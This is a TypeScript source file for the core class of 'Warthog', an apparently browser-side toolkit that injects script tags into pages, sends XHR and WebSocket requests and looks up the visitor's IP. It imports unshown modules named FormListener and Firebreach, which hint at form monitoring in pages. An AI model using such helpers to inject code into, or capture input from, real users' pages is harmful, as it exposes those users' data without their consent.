import { WarthogInterface } from './interfaces/warthog';
import { Dependency } from './interfaces/dependency';
import { Kaspersky } from './modules/kaspersky';
import { FormListener } from './modules/form-listener';
import { Firebreach } from './lib/firebreach';

//Global context
declare var _wt: any;

/**
 * Warthog core
 * 
 * @export
 * @class Warthog
 * @implements {WarthogInterface}
 */
export class Warthog implements WarthogInterface {
	url: string;
	ip: string;

	/**
	 * Creates an instance of Warthog.
	 * @memberOf Warthog
	 */
	constructor(url?: string) {
		this.url = url;
	}

	/**
	 * Required function
	 * @memberOf Warthog
	 */
	init(): void {
	}

	/**
	 * Inject a script tag into a page
	 * 
	 * @param {Dependency} dependency
	 * @memberOf Warthog
	 */
	injectScript(dependency: Dependency): void {
		var js, fjs: HTMLScriptElement = document.getElementsByTagName("script")[0];

		if (document.getElementById(dependency.id)) { return; }

		js = document.createElement("script");
		js.onload = dependency.callback;
		js.id = dependency.id;
		js.src = dependency.url;
		js.text = dependency.content;

		fjs.parentNode.insertBefore(js, fjs);
	}

	/**
	 * Creates an instance of XMLHttpRequest
	 * 
	 * @param {string} method
	 * @param {string} url
	 * @param {any} callback
	 * @returns {XMLHttpRequest}
	 * @memberOf Warthog
	 */
	ajax(method:string, url:string, callback: any): XMLHttpRequest {
		var xhr: XMLHttpRequest = new XMLHttpRequest();
		xhr.open(method, url);

		if (method == "POST") {
			xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
		}

		xhr.onreadystatechange = function() {
			if (callback && xhr.readyState == 4 && xhr.status == 200) {
				callback(xhr.responseText);
			}
		};

		return xhr;
	}

	/**
	 * Get IP of client
	 * 
	 * @param {any} callback
	 * @memberOf Warthog
	 */
	getIP(callback: any) {
		if (this.ip != null) {
            callback(this.ip);
            return;
        }

        var self: Warthog = this;
        var jsonip = {
            id: "jsonip",
            url: "http://ip-api.com/json?callback=_start.getip",
            content: null,
            callback: function() {
                self.ip = _wt.ip;
                callback(self.ip);
            }
        };

        this.injectScript(jsonip);
	}

	/**
	 * Socket
	 * 
	 * @param {any} url
	 * @param {any} callback
	 * @param {any} method
	 * @memberOf Warthog
	 */
	socket(url, callback, method) {
		if (method == "undefined" || method != "wss") {
			method = "ws";
		}

		var socket: WebSocket = new WebSocket(method + "://" + url);
		socket.onopen = callback;
	}
}

var x: Warthog = new Warthog();
x.init();
